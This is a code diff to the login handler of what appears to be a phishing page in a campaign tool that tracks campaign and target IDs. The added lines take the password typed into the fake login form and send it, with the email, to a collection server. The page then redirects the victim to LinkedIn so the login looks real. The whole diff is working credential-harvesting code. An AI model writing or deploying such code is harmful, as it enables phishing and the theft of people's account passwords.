@@ -215,11 +215,12 @@
       if (isPreview) return;
 
       const email = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
       try {
         const res = await fetch('http://localhost:4000/submit', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email, campaign_id: campaignId, target_id: targetId }),
+          body: JSON.stringify({ email, password, campaign_id: campaignId, target_id: targetId }),
         });
         const data = await res.json();
         window.location.href = data.redirect || 'https://www.linkedin.com';
